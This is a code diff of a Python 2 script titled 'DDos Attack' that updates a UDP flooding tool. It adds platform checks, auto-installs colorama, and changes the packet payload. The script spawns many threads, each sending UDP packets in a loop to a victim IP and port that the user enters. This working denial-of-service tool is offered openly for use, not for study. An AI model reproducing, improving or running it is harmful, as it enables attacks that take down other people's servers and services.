@@ -1,22 +1,41 @@
 #!/usr/bin/python
 # This code write by (Mr.nope)
-# DDos Attack
-from colorama import Fore,init
-import time
+# DDos Attack v1.5.2
 import os
+try:
+   from colorama import Fore,init
+   init()
+except ImportError:
+    os.system("pip3 install colorama")
+import time
 import sys
 import socket
 import thread
-init()
+import platform
+system = platform.uname()[0]
+def title():
+    if system == 'Linux':
+      os.system("printf '\033]2;DDos-Attack\a'")
+    elif system == 'Windows':
+        os.system("title DDos-Attack")
+    else:
+         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
+         sys.exit()         
 def cls():
-    os.system("clear")
+    if system == 'Windows':
+      os.system("cls")
+    elif system == 'Linux':
+        os.system("clear")
+    else:
+         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
+         sys.exit()
 class color:
     red = '\033[91m'
     green = '\033[92m'
     End = '\033[0m'
     blue = '\033[33m'
 def menu():
-    os.system("printf '\033]2;DDos-Attack\a'")
+    title()
     cls()
     print color.green + """
  ______   ______   _______  _______         _______  _______  _______  _______  _______  ___   _
@@ -35,7 +54,7 @@ def menu():
     ##################################################
     UDP_PORT = port
     time.sleep(2)
-    MESSAGE = "\nstarting DDos Attack... "
+    MESSAGE = "01010101001010101101010"
     time.sleep(1)
     os.system("clear")
     print color.red + "=============================================================================\n" + color.End
@@ -49,17 +68,15 @@ def menu():
                       try:
                          sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                          sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
-                         print color.green + "\nThe package is sent to: " + color.red + web + color.End
-                      except KeyboardInterrupt:
-                          print"\nCtrl + C"
-                          print"\nStoping DDosAttack...!"
+                         print color.green + "\nThe packet is sent to: " + color.red + web + color.End
+                      except:
+                          print "\nStop !!!\n"
                           sys.exit()
     for i in xrange(port):
             try:
                thread.start_new_thread( dos , ("Thread-"+str(i),) )
             except:
-                   print"\nCtrl + C "
-                   print"\nDDos-Attack Stoping...!"
+                   print " "
                    sys.exit()
 
     try:
@@ -69,7 +86,12 @@ def menu():
         sys.exit()
 if __name__ == '__main__':
     try:
-        menu()
+        try:
+           menu()
+        except EOFError:
+            print "\nCtrl + D"
+            print "\nExiting..."
+            sys.exit()
     except KeyboardInterrupt:
         print "\nCtrl + C"
         print "\nExiting..."
